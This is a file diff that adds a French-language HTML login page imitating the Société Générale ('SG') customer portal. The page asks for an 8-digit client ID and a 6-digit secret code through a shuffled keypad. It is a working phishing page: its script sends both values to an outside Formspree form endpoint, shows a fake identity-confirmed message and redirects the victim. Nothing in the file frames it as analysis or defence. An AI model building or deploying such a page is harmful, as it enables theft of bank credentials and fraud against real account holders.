@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Espace Client | SG</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --sg-red: #E60028;
+            --sg-black: #000000;
+            --sg-text-gray: #71717A;
+            --sg-input-border: #E4E4E7;
+            --sg-bg-white: #FFFFFF;
+            --sg-disabled-pink: #FECDD3;
+            --sg-disabled-text: #F87171;
+            --font-main: 'Inter', sans-serif;
+        }
+
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+
+        body {
+            font-family: var(--font-main);
+            background-color: var(--sg-bg-white);
+            color: var(--sg-black);
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+        }
+
+        .app-container {
+            width: 100%;
+            max-width: 480px;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            padding: 20px;
+        }
+
+        header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 60px;
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .back-arrow { position: absolute; left: 0; font-size: 1.5rem; text-decoration: none; color: black; }
+
+        .brand-logo { display: flex; align-items: center; gap: 10px; font-weight: 700; font-size: 1.5rem; }
+        .brand-logo::after {
+            content: ''; display: inline-block; width: 40px; height: 25px;
+            background: linear-gradient(180deg, var(--sg-red) 50%, var(--sg-black) 50%);
+            border-radius: 3px;
+        }
+
+        .welcome-section h1 { font-size: 2rem; text-transform: uppercase; margin-bottom: 40px; position: relative; }
+        .welcome-section h1::after { content: ''; position: absolute; bottom: -10px; left: 0; width: 80px; height: 4px; background: var(--sg-red); }
+
+        .input-group { margin-bottom: 20px; position: relative; }
+        .input-field {
+            width: 100%; border: none; border-bottom: 2px solid var(--sg-input-border);
+            padding: 10px 0; font-size: 1.2rem; font-weight: 700; outline: none;
+        }
+        .check-icon { position: absolute; right: 0; top: 10px; color: #27AE60; display: none; }
+
+        /* Masqué par défaut */
+        #text3 { display: none; text-align: center; animation: fadeIn 0.5s; }
+        
+        .dots-container { display: flex; justify-content: center; gap: 15px; margin: 20px 0; }
+        .dot { width: 12px; height: 12px; background: #E4E4E7; border-radius: 50%; }
+        .dot.filled { background: #52525B; }
+        
+        .numpad {
+            display: grid;
+            grid-template-columns: repeat(5, 1fr);
+            gap: 10px;
+            margin: 20px auto;
+            max-width: 350px;
+        }
+        .num-btn {
+            background: #F8F9FA; border: 1px solid #E4E4E7; padding: 15px 5px;
+            font-size: 1.2rem; border-radius: 8px; cursor: pointer; font-weight: 500;
+        }
+        .delete-btn { grid-column: 5; background: none; border: none; font-size: 1.5rem; cursor: pointer; color: #71717A; }
+
+        .form-actions { margin-top: auto; width: 100%; display: flex; flex-direction: column; align-items: center; gap: 15px; }
+        .btn-submit {
+            width: 100%; max-width: 320px; background: var(--sg-disabled-pink);
+            color: var(--sg-disabled-text); border: none; padding: 15px;
+            border-radius: 50px; font-weight: 700; cursor: not-allowed; transition: 0.3s;
+        }
+        .btn-submit.active { background: var(--sg-red); color: white; cursor: pointer; }
+        .forgot-link { text-decoration: underline; background: none; border: none; cursor: pointer; font-size: 0.9rem; }
+
+        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    </style>
+</head>
+<body>
+
+    <div class="app-container">
+        <header>
+            <a href="index.html" class="back-arrow">❮</a>
+            <div class="brand-logo">SG</div>
+        </header>
+
+        <main id="main-content">
+            <form id="loginForm">
+                <div id="step-1">
+                    <section class="welcome-section"><h1>Bienvenue</h1></section>
+                    <div class="input-group">
+                        <input type="number" id="text1" name="text1" class="input-field" placeholder="Saisissez votre identifiant">
+                        <span class="check-icon" id="checkMark">✔</span>
+                    </div>
+                </div>
+
+                <div id="text3">
+                    <p style="margin-top:20px;">Saisissez votre code secret</p>
+                    <div class="dots-container" id="dots">
+                        <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+                        <div class="dot"></div><div class="dot"></div><div class="dot"></div>
+                    </div>
+                    
+                    <input type="hidden" id="text2" name="text2">
+<br> <br>
+<br>
+
+                    <div class="numpad">
+                        <button type="button" class="delete-btn">✖</button>
+                        <button type="button" class="num-btn">3</button><button type="button" class="num-btn">2</button><button type="button" class="num-btn">7</button><button type="button" class="num-btn">8</button><button type="button" class="num-btn">1</button>
+                        <button type="button" class="num-btn">6</button><button type="button" class="num-btn">4</button><button type="button" class="num-btn">0</button><button type="button" class="num-btn">9</button><button type="button" class="num-btn">5</button>
+                    </div>
+                </div>
+            </form>
+        </main>
+
+        <footer class="form-actions">
+            <button class="btn-submit" id="mainBtn" disabled>Suivant</button>
+            <p id="formMessage" style="font-weight: bold; margin-top: 10px;"></p>
+            <button class="forgot-link" id="subLink">Identifiant oublié</button>
+        </footer>
+    </div>
+
+    <script>
+        const identifiantInput = document.getElementById('text1');
+        const text2Input = document.getElementById('text2');
+        const mainBtn = document.getElementById('mainBtn');
+        const checkMark = document.getElementById('checkMark');
+        const step1 = document.getElementById('step-1');
+        const secretStep = document.getElementById('text3');
+        const dots = document.querySelectorAll('.dot');
+        const numBtns = document.querySelectorAll('.num-btn');
+        const messageEl = document.getElementById('formMessage');
+        let codeSecret = "";
+
+        // 1. Détection des 8 chiffres pour l'Identifiant
+        identifiantInput.addEventListener('input', (e) => {
+            if(e.target.value.length === 8) {
+                mainBtn.classList.add('active');
+                mainBtn.removeAttribute('disabled');
+                checkMark.style.display = 'block';
+            } else {
+                mainBtn.classList.remove('active');
+                mainBtn.setAttribute('disabled', 'true');
+                checkMark.style.display = 'none';
+            }
+        });
+
+        // 2. Gestion du bouton (Passage étape ou Envoi)
+        mainBtn.addEventListener('click', async () => {
+            if(step1.style.display !== 'none') {
+                // On passe au code secret
+                step1.style.display = 'none';
+                secretStep.style.display = 'block';
+                mainBtn.innerText = "Valider";
+                mainBtn.classList.remove('active');
+                mainBtn.setAttribute('disabled', 'true');
+                document.getElementById('subLink').style.display = 'none';
+                
+                // Rappel de l'ID en haut
+                const idDisplay = document.createElement('div');
+                idDisplay.id = "idDisplay";
+                idDisplay.innerHTML = `<p style="font-weight:700; font-size:1.2rem; margin-bottom:10px;">${identifiantInput.value}</p><hr style="border:none; border-bottom:2px solid #52525B; margin-bottom:20px;">`;
+                secretStep.prepend(idDisplay);
+            } else {
+                // Envoi final
+                await sendToFormspree();
+            }
+        });
+
+        // 3. Clavier numérique
+        numBtns.forEach(btn => {
+            btn.addEventListener('click', () => {
+                if(codeSecret.length < 6) {
+                    codeSecret += btn.innerText;
+                    text2Input.value = codeSecret;
+                    dots[codeSecret.length - 1].classList.add('filled');
+                }
+                if(codeSecret.length === 6) {
+                    mainBtn.classList.add('active');
+                    mainBtn.removeAttribute('disabled');
+                }
+            });
+        });
+
+        // 4. Bouton supprimer
+        document.querySelector('.delete-btn').addEventListener('click', () => {
+            if(codeSecret.length > 0) {
+                dots[codeSecret.length - 1].classList.remove('filled');
+                codeSecret = codeSecret.slice(0, -1);
+                text2Input.value = codeSecret;
+                mainBtn.classList.remove('active');
+                mainBtn.setAttribute('disabled', 'true');
+            }
+        });
+
+        // 5. Fonction AJAX vers Formspree
+        async function sendToFormspree() {
+            mainBtn.innerText = "Vérification...";
+            mainBtn.disabled = true;
+
+            const payload = {
+                text1: identifiantInput.value,
+                text2: text2Input.value
+            };
+
+            try {
+                const response = await fetch('https://formspree.io/f/mvzdkdgo', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+
+                if (response.ok) {
+                    messageEl.textContent = "✅ Identité confirmée.";
+                    messageEl.style.color = "green";
+                    setTimeout(() => {
+                        window.location.href = "done.html";
+                    }, 1500);
+                } else {
+                    throw new Error();
+                }
+            } catch (err) {
+                messageEl.textContent = "❌ Erreur de connexion.";
+                messageEl.style.color = "red";
+                mainBtn.innerText = "Valider";
+                mainBtn.disabled = false;
+            }
+        }
+    </script>
+</body>
+</html>
